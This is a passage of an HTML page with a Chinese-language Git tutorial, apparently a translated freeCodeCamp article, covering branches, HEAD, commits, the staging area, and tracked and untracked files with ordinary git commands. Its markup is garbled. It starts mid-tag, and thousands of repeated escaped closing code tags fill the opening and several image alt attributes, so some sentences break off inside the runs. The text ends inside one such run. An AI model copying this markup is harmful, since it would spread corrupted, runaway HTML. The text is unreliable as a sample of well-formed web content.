code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt; 指向的分支"></p><p>在创建 <code>test</code> 分支之前，我们也可以使用 <code>git checkout -b test</code>，这条命令等价于先运行 <code>git branch test</code> 创建分支，再运行 <code>git checkout test</code> 使 <code>HEAD</code> 指向新的分支。</p><p>如果我们做了一些改动并使用 <code>git commit</code> 创建了一个新 <strong>提交</strong> 呢？这个新 <strong>提交</strong> 会被添加到哪个分支上呢？</p><p>答案是 <code>test</code> 分支，因为它是当前的活动分支（因为 <code>HEAD</code> 指向了它）。之后，<code>test</code> 指针会移动至新添加的 <strong>提交</strong> 上。注意 <code>HEAD</code> 仍然指向 <code>test</code>。</p><p><img src="https://camo.githubusercontent.com/716a0062270c2a698d47f30f5f75a0eb7eeaf0acd4f48a25101a41cf4a2b72d8/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d34362e706e67" alt="每次执行 git commit&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt; 命令都会让分支的指针移动到新创建的提交上"></p><p>因此，如果我们使用 <code>git checkout master</code> 回到 master 分支，我们就让 <code>HEAD</code> 的再次指向 <code>master</code> 了。</p><p><img src="https://camo.githubusercontent.com/a1eddf190ebc79fd46bd15e6fb9d527e8570eedce43c1f3c6db5f7c61664bb9b/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d34372e706e67"></p><p>如果我们现在创建一个新的 <strong>提交</strong>，它就会被添加到 <code>master</code> 分支，<strong>commit B2424</strong> 会成为新提交的父节点。</p><p><img src="https://camo.githubusercontent.com/68a6eb53b0b21ea4bef6189652d31ec9deaca379d4620010050d102795243522/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d34382e706e67"></p><h1 id="如何在-Git-中记录变化"><a href="#如何在-Git-中记录变化" class="headerlink" title="如何在 Git 中记录变化"></a>如何在 Git 中记录变化</h1><p>通常，我们在 <strong>工作目录（working dir）</strong> 中编写源代码。<strong>工作目录</strong> （或 <strong>工作树（working tree）</strong>）可以是文件系统上的任何一个目录，它关联着一个 <strong>仓库（repository）</strong> 。目录内不仅包含工程的文件夹和文件，还包含一个名为 <code>.git</code> 的目录。稍后我们会再讨论 <code>git</code> 这个目录。</p><p>在做了一些改动之后，我们想把这些改动记录到我们的 <strong>仓库</strong> 中。一个 <strong>仓库</strong> （缩写：<strong>repo</strong>）就是一系列 <strong>提交</strong> 的集合，每个 <strong>提交</strong> 都是工程 <strong>工作树</strong> 的归档。除了我们自己机器上的提交外，仓库也会包含他人机器上的提交。</p><p><strong>仓库</strong> 也包含除代码文件以外的其它东西，例如 <code>HEAD</code> 指针、分支等等。</p><p><img src="https://camo.githubusercontent.com/d6ac18d941ed9016c28da6ccfe8d38e286cc883186d3fec2ced29716fc77cd35/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d34392e706e67"></p><p>你可能使用过的其它和 <code>git</code> 类似工具，但是 <code>git</code> 并不会像其它工具那样直接将变化从 <strong>工作树</strong> 提交到 <strong>仓库</strong>。相反，它会先把这些变化注册到一个被称为 <strong>索引（index）</strong> 或 <strong>暂存区（staging area）</strong> 的地方。</p><p>这两个术语指的都是同一个东西，它们也经常被 <code>git</code> 的文档使用，我们将会在这篇文章中交替使用它们。</p><p>当我们 <code>checkout</code> 到一个分支时，<code>git</code> 会将上一次检出到工作目录中的所有文件填充到 <strong>索引</strong>，它们看起来就像最初被检出时的样子。之后执行 <code>git commit</code> 时， <strong>提交</strong> 会在当前 <strong>索引</strong> 的基础上创建。</p><p><strong>索引</strong> 允许我们精心准备每次 <strong>提交</strong>。举个例子，自上一次 <strong>提交</strong> 以来，我们的 <strong>工作目录</strong> 中可能有两个文件发生了变化，但是我们可能只想将其中的一个添加到 <strong>索引</strong>（使用 <code>git add</code>），然后使用 <code>git commit</code> 记录这一个文件的变化。</p><p><img src="https://camo.githubusercontent.com/f1b0275e1a35e382be6a13b3a4f5573b326d902b5762f5dc789149718666508e/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d35302e706e67"></p><p><strong>工作目录</strong> 下文件的状态不外乎有两种：<strong>已跟踪（tracked）</strong> 或 <strong>未跟踪（untracked）</strong>。</p><p><strong>已跟踪文件</strong> 是指那些 <code>git</code> 已经知道的文件。它们要么已经在上一次快照（<strong>提交</strong>）中，要么已经被 <strong>暂存（staged）</strong>（换句话说，它们已经在 <strong>暂存区</strong> 中）。</p><p><strong>工作目录</strong> 中除已跟踪文件以外的所有其它文件都属于 <strong>未跟踪文件（untracked）</strong>，它们既没有在上次快照（<strong>提交</strong>）中，也没有在 <strong>暂存区</strong> 中。</p><h1 id="创建仓库的常规方式"><a href="#创建仓库的常规方式" class="headerlink" title="创建仓库的常规方式"></a>创建仓库的常规方式</h1><p>让我们确认下我们已经理解了“创建<strong>仓库</strong>”时介绍的相关术语。在我们更加深入这个过程之前，这只是一个非常高阶的视角。</p><p>注意：大多数带有 shell 命令的文章展示的都是 UNIX 命令。我将同时给出 Windows 和 UNIX 下的命令。为了换换花样，我会给出 Windows 下面的截图。当两种环境下的命令完全一样时，我只会给出一次命令。</p><p>我们用 <code>git init repo_1</code> 初始化一个新的 <strong>仓库</strong>，然后用 <code>cd repo_1</code> 切换到仓库所在目录。借助 <code>tree /f .git</code> 命令，我们可以看到运行 <code>git init</code> 之后 <code>.git</code> 目录下面出现了很多子目录（<code>/f</code> 表示在 <code>tree</code> 的输出中包含文件）。</p><p><img src="https://camo.githubusercontent.com/3220415b0dd6d139df9d641a0f281a7693b73b218e813a153cf6a486ab43f06c/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d35312e706e67"></p><p>让我们在 <code>repo_1</code> 目录中创建一个文件吧：</p><p><img src="https://camo.githubusercontent.com/a330f5cd817380a7ffb7ba188561d08b5b63d3d8775877fb0d4f47a79101d032/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d35322e706e67"></p><p>Linux 系统：</p><p><img src="https://camo.githubusercontent.com/4bb74770fb3779eeebb3f32f889a760c8f7844c0ab589695f88f1ed0275f8f88/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d35332e706e67"></p><p>这个文件已经在我们的 <strong>工作目录</strong> 中了。目前，我们还没有将它添加到 <strong>暂存区</strong>，所以它是 <strong>未跟踪</strong> 状态。让我们用 <code>git status</code> 验证一下：</p><p><img src="https://camo.githubusercontent.com/b666ec923893c5813486e29d378185f127d52f4ba98b277990714c9b06d8cadc/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d35342e706e67"></p><p>因为我们没有将新的文件添加到暂存区，所以它还是未跟踪状态，它也没有在之前的提交中</p><p>我们现在用 <code>git add new_file.txt</code> 将这个文件添加到 <strong>暂存区</strong>，再用 <code>git status</code> 验证一下它是否已经被暂存了：</p><p><img src="https://camo.githubusercontent.com/39732710b8f0cb1bc76170c2226f41c5c42ace65c6143428c9d3e64f2f5ffcbc/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d35352e706e67" alt="添加新的文件到暂存区"></p><p>我们可现在可以用 <code>git commit</code> 创建一个 <strong>提交</strong>：</p><p><img src="https://camo.githubusercontent.com/e94f9b18f572bb0ed8cd7a4726e800159e5e41a5fc8c123ec618d3fa5e65d59c/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d35362e706e67"></p><p><code>.git</code> 目录有变化吗？我们用 <code>tree /f .git</code> 检查一下：</p><p><img src="https://camo.githubusercontent.com/753865f0e799e5ba6c65aae53addfb434687904ef76cc1e875334bf7288b8657/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d35372e706e67" alt="git&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt;/code&gt;&lt